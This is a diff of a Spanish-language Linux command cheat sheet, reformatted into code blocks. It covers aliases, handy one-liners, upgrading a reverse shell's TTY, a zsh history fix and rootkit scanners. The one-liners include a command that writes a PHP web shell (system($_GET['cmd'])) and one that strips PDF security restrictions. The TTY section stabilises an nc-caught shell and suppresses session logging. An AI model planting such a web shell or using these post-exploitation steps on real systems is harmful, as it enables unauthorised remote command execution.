@@ -1,4 +1,4 @@
-
+<img width="1280" height="720" alt="3QcDo" src="https://github.com/user-attachments/assets/bed194d0-f34e-4bf4-9a30-a8c8d3105810" />
 ### 🗃️ SISTEMA DE ARCHIVOS {#sistema-de-archivos}
   
 FHS:
@@ -600,14 +600,18 @@ Definir un ALIAS Temporal para el Usuario Actual (se borrará al cerrar la t
 alias [nombre_alias]="[comando]"
 ```
   
-Ejemplo:  
-alias ip-public="curl config.me"  
+Ejemplo:
+```
+alias ip-public="curl config.me"
   
 ip-public  
-10.100.100.10  
+10.100.100.10
+```
   
-Listar por terminal los ALIAS Temporales del Usuario Actual:  
-alias  
+Listar por terminal los ALIAS Temporales del Usuario Actual:
+```
+alias
+
 diff='diff --color=auto'  
 egrep='egrep --color=auto'  
 fgrep='fgrep --color=auto'  
@@ -619,201 +623,267 @@ la='ls -A'
 ll='ls -l'  
 ls='ls --color=auto'  
 which-command=whence
+```
 
-### Eliminar un ALIAS del Usuario Actual:
-
-### unalias  
+Eliminar un ALIAS del Usuario Actual:
+```
+unalias
+```
   
-Abrir archivo de ALIAS Permanentes del Usuario Actual en cada SHELL:  
+Abrir archivo de ALIAS Permanentes del Usuario Actual en cada SHELL:
+```
 mousepad ~/.zshrc  
-mousepad ~/.bashrc  
+mousepad ~/.bashrc
+```
   
-Tanto en ~/.zshrc como en ~/.bashrc los ALIAS Permanentes se encuentran al final del archivo programados como:  
-alias ex='example'  
+Tanto en ~/.zshrc como en ~/.bashrc los ALIAS Permanentes se encuentran al final del archivo programados como:
+```
+alias ex='example'
+```
   
-Listar por terminal los ALIAS Permanentes del Usuario Actual en ZSH:  
-grep 'alias' ~/.zshrc ~/.zsh_profile ~/.zsh_aliases  
+Listar por terminal los ALIAS Permanentes del Usuario Actual en ZSH:
+```
+grep 'alias' ~/.zshrc ~/.zsh_profile ~/.zsh_aliases
+```
    
-Listar por terminal los ALIAS Permanentes del Usuario Actual en BASH:  
-grep 'alias' ~/.bashrc ~/.bash_profile ~/.bash_aliases  
+Listar por terminal los ALIAS Permanentes del Usuario Actual en BASH:
+```
+grep 'alias' ~/.bashrc ~/.bash_profile ~/.bash_aliases
+```
   
-Listar por terminal los ALIAS Permanentes de Root en ZSH:  
-sudo grep 'alias' /root/.zshrc /root/.zsh_profile /root/.zsh_aliases  
+Listar por terminal los ALIAS Permanentes de Root en ZSH:
+```
+sudo grep 'alias' /root/.zshrc /root/.zsh_profile /root/.zsh_aliases
+```  
   
-Listar por terminal los ALIAS Permanentes de Root en BASH:  
+Listar por terminal los ALIAS Permanentes de Root en BASH:
+```
 sudo grep 'alias' /root/.bashrc /root/.bash_profile /root/.bash_aliases
+```
 
-[
-
-](https://sf01web.wixsite.com/mayusoeh/comandos-linux)
-
-### 1️⃣ ONE-LINERS  
+### 1️⃣ ALGUNOS ONE-LINERS ÚTILES
   
-Reemplazar los espacios por guiones bajos en los nombres de todos los archivos del directorio actual:  
-rename 'y/ /_/' *  
+Reemplazar los espacios por guiones bajos en los nombres de todos los archivos del directorio actual:
+```
+rename 'y/ /_/' *
+```
   
-Pasar a minúsculas los nombres de todos los archivos del directorio actual:  
-rename 'y/A-Z/a-z' *  
+Pasar a minúsculas los nombres de todos los archivos del directorio actual:
+```
+rename 'y/A-Z/a-z' *
+```
   
-Crear contraseña fuerte y aleatoria de 15 caracteres:  
+Crear contraseña fuerte y aleatoria de 15 caracteres:
+```
 head -c 15 /dev/urandom | md5sum | base64 | head -c 15; echo  
-alias new-pass1='head -c 15 /dev/urandom | md5sum | base64 | head -c 15; echo'  
-  
+alias new-pass1='head -c 15 /dev/urandom | md5sum | base64 | head -c 15; echo'
+```
+```
 LC_ALL=C tr -dc 'A-Za-z0-9?' </dev/urandom | head -c 15  
-alias new-pass2='LC_ALL=C tr -dc 'A-Za-z0-9?' </dev/urandom | head -c 15'  
+alias new-pass2='LC_ALL=C tr -dc 'A-Za-z0-9?' </dev/urandom | head -c 15'
+``` 
   
-Ver parte meteorológico de Madrid:  
-curl wttr.in/madrid  
+Ver parte meteorológico de una ciudad (Madrid):
+```
+curl wttr.in/madrid
+```
   
-Salvapantallas de terminal estilo Matrix:  
+Salvapantallas de terminal estilo Matrix:
+```
 tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"  
-alias matrix='tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"'  
+alias matrix='tr -c "[:digit:]" " " < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR="1;32" grep --color "[^ ]"'
+```
   
-Salvapantallas de terminal que imita actividad:  
+Salvapantallas de terminal que imita actividad:
+```
 cat /dev/urandom |  hexdump -C |  grep "ca fe"  
-alias infinitehack='cat /dev/urandom | hexdump -C | grep "ca fe"'  
+alias infinitehack='cat /dev/urandom | hexdump -C | grep "ca fe"'
+```
   
-Desactivar limitaciones de seguridad de documento PDF:  
-gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrite -f INPUT.pdf  
+Desactivar limitaciones de seguridad de documento PDF:
+```
+gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrite -f INPUT.pdf
+```
   
-Ver Star Wars en código ASCII a través de Telnet:  
-telnet towel.blinkenlights.nl  
+Ver Star Wars en código ASCII a través de Telnet:
+```
+telnet towel.blinkenlights.nl
+```
   
-Listar los comandos más usados por el usuario actual en orden de más a menos usado:  
-history | awk '{print$2}' | sort | uniq -c | sort -rn | head  
+Listar los comandos más usados por el usuario actual en orden de más a menos usado:
+```
+history | awk '{print$2}' | sort | uniq -c | sort -rn | head
+```
    
-Buscar archivos con el mismo HASH MD5 desde el directorio actual:  
-find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -c 35-  
+Buscar archivos con el mismo HASH MD5 desde el directorio actual:
+```
+find -type f -exec md5sum '{}' ';' | sort | uniq --all-repeated=separate -w 33 | cut -c 35-
+```
    
-Ver fecha actual con petición curl:  
-curl -sS [https://worldtimeapi.org/api/timezone/Europe/Madrid](https://worldtimeapi.org/api/timezone/Europe/Madrid) | awk 'NR==1' | awk '{print$4}' FS=":"  
+Ver fecha actual con petición curl:
+```
+curl -sS [https://worldtimeapi.org/api/timezone/Europe/Madrid](https://worldtimeapi.org/api/timezone/Europe/Madrid) | awk 'NR==1' | awk '{print$4}' FS=":"
+```
 ​  
-Crear archivo .php para activar conexión remota desde navegador mediante shell:  
-echo '<?php system($_GET["cmd"]); ?>' > shell.php  
+Crear archivo .php para activar conexión remota desde navegador mediante shell:
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
 ​​
-
-[
-
-](https://sf01web.wixsite.com/mayusoeh/comandos-linux)
-
 ###  ​🈂️ TRATAMIENTO DE LA TTY (MEJORAR UNA SHEL PRECARIA)  
    
 En un entorno Linux, TTY (TeleTYpewriter) es un término que se refiere a una interfaz de texto que permite la comunicación entre el usuario y el sistema. Originalmente, los TTY eran dispositivos físicos (teletipos) que se utilizaban para interactuar con los sistemas informáticos, pero en la actualidad, el término se refiere principalmente a las terminales virtuales o consolas de texto en sistemas modernos.  
   
 Cuando se habla de tratar la TTY se hace referencia a mejorar el display de la shell, o incluso de mejorar de shell (por ejemplo de una sh a una bash). A continuación, algunas formas de lograrlo cuando manejamos una shell remota que entra por un puerto dado, "escuchando" con NetCat:  
   
-  
-1️⃣ MÉTODO 1 (Más sencillo, aunque no suele funcionar. Diagnosticar tipo de terminal con echo $TERM):  
+1️⃣ MÉTODO 1 (Más sencillo, aunque no suele funcionar. Diagnosticar tipo de terminal con echo $TERM):
+```
 shell  
-bash  
-   
-  
+bash
+```
+
 2️⃣ MÉTODO 2:  
-1º. (Inicia una sesión de bash interactiva, descartando la grabación de la sesión)  
-script /dev/null -c bash  
+1º. (Inicia una sesión de bash interactiva, descartando la grabación de la sesión)
+```
+script /dev/null -c bash
+```
   
-2º. (Suspende el proceso actual en la terminal y lo envía a segundo plano)  
-[ctrl] + [Z]  
+2º. (Suspende el proceso actual en la terminal y lo envía a segundo plano)
+```
+[ctrl] + [Z]
+```
   
 3º. (Configura la terminal en modo "raw" o "crudo" y desactiva el eco, luego retoma el proceso suspendido anteriormente)  
+```
 stty raw -echo; fg  
-zsh: suspended nc -nlvp 4444  
+zsh: suspended nc -nlvp 4444
+```
   
-​NOTA: Si la terminal queda en un estado inestable o falla, recuperarla con:  
-stty sane  
-o  
-reset  
+​NOTA: Si la terminal queda en un estado inestable o falla, recuperarla con:
+```
+stty sane
+```
+o bien
+```
+reset
+```
   
-4º. (No se ve el input. Reinicia la configuración de la terminal al tipo "xterm"):  
-reset xterm  
+4º. (No se ve el input. Reinicia la configuración de la terminal al tipo "xterm"):
+```
+reset xterm
+```
 ​  
-5ª. (Establece el tipo de terminal como "xterm")  
-export TERM=xterm  
+5ª. (Establece el tipo de terminal como "xterm"):
+```
+export TERM=xterm
+```
 ​  
-6ª. (Establece bash como la shell predeterminada para la sesión actual)  
-export SHELL=bash  
+6ª. (Establece bash como la shell predeterminada para la sesión actual):
+```
+export SHELL=bash
+```
   
-  
-3️⃣ MÉTODO 3 (comprobar si python/python3 están presentes en el sistema con which python/which python3):  
-1º. (Este comando usa Python para invocar una shell interactiva)  
-python3 -c ‘import pty;pty.spawn(“/bin/bash”)’  
+3️⃣ MÉTODO 3 (comprobar si python/python3 están presentes en el sistema con which python/which python3). 
+1º. (Este comando usa Python para invocar una shell interactiva):
+```
+python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+```
   
 2º. (Ejecuta una bash shell mientras suprime la grabación de log de la sesión)  
 /usr/bin/script -qc /bin/bash /dev/null  
   
-3º. (Establece un tipo de sesión de terminal que soporte funciones avanzadas como 256 colores)  
-export TERM=xterm-256color  
-   
-   
-3️⃣ MÉTODO 4 (comprobar si perl está presente en el sistema con which perl):  
-1º. (Estos comandos usan Perl para invocar una shell interactiva)  
-perl -e 'exec "/bin/bash";'  
-o  
-perl -e 'require "pty.pm"; PTY::spawn("/bin/bash");'  
+3º. (Establece un tipo de sesión de terminal que soporte funciones avanzadas como 256 colores):
+```
+export TERM=xterm-256color
+```
+
+3️⃣ MÉTODO 4 (comprobar si perl está presente en el sistema con which perl).
+1º. (Estos comandos usan Perl para invocar una shell interactiva):
+```
+perl -e 'exec "/bin/bash";'
+```
+o bien
+```
+perl -e 'require "pty.pm"; PTY::spawn("/bin/bash");'
+``` 
 ​  
-2º. (Ejecuta una bash shell mientras suprime la grabación de log de la sesión)  
-/usr/bin/script -qc /bin/bash /dev/null  
+2º. (Ejecuta una bash shell mientras suprime la grabación de log de la sesión):
+```
+/usr/bin/script -qc /bin/bash /dev/null
+```
    
-3º. (Establece un tipo de sesión de terminal que soporte funciones avanzadas como 256 colores)  
-export TERM=xterm-256color  
- 
-
-[
-
-](https://sf01web.wixsite.com/mayusoeh/comandos-linux)
+3º. (Establece un tipo de sesión de terminal que soporte funciones avanzadas como 256 colores):
+```
+export TERM=xterm-256color
+```
 
 ### ⚠️ ZSH_HISTORY FIX  
   
-ERROR por terminal:  
-zsh: corrupt history file /home/user/.zsh_history  
+ERROR por terminal:
+```
+zsh: corrupt history file /home/user/.zsh_history
+```
   
-Forzar recarga del historial (comprobación de error):  
-fc -R  
+Forzar recarga del historial (comprobación de error):
+```
+fc -R
+```  
   
-Eliminar archivo corrupto .zsh_history. Se reinicia la información guardada en dicho archivo y desaparece el error:  
-rm ~/.zsh_history  
- 
-
-[
-
-](https://sf01web.wixsite.com/mayusoeh/comandos-linux)
+Eliminar archivo corrupto .zsh_history. Se reinicia la información guardada en dicho archivo y desaparece el error:
+```
+rm ~/.zsh_history
+```
 
 ### ❓ COMANDOS DE AYUDA  
-  
+
+```
 [comando] -?  
 [comando] -h  
 [comando] --help  
 man [comando]   
-tldr [comando]  
+tldr [comando]
+```
   
-⏱️ Mostrar el tiempo que tarda en ejecutarse un comando:  
-time [comando]  
- 
-
-[
-
-](https://sf01web.wixsite.com/mayusoeh/comandos-linux)
+⏱️ Mostrar el tiempo que tarda en ejecutarse un comando:
+```
+time [comando]
+```
 
 ### 🔁  CONTRAMEDIDAS  
   
-Reducir los permisos de /tmp a solo lectura y ejecución, de grupos y resto usuarios:  
-sudo chmod 755 /tmp  
+Reducir los permisos de /tmp a solo lectura y ejecución, de grupos y resto usuarios:
+```
+sudo chmod 755 /tmp
+```
+  
 ____________________________________________________________________________________________  
   
 CHKROOTKIT  
 Programa que busca rootkits en tu sistema.  
   
-Instalar:  
-sudo apt-get install chkrootkit  
-Ver parámetros:  
-man chkrootkit  
-Ejecutar:  
-sudo chkrootkit  
+Instalar:
+```
+sudo apt-get install chkrootkit
+```
+Ver parámetros:
+```
+man chkrootkit
+```
+Ejecutar:
+```
+sudo chkrootkit
+```
   
-Ejecutar versión preconfigurada, diseñada para ser ejecutada diariamente por un temporizador de systemd o como un trabajo de cron:  
-sudo chkrootkit-daily  
-El archivo de configuración se encuentra en:  
-/etc/chkrootkit/chkrootkit.conf  
+Ejecutar versión preconfigurada, diseñada para ser ejecutada diariamente por un temporizador de systemd o como un trabajo de cron:
+```
+sudo chkrootkit-daily
+```
+
+El archivo de configuración se encuentra en:
+```
+/etc/chkrootkit/chkrootkit.conf
+```
+  
 ____________________________________________________________________________________________  
   
 LYNIS  
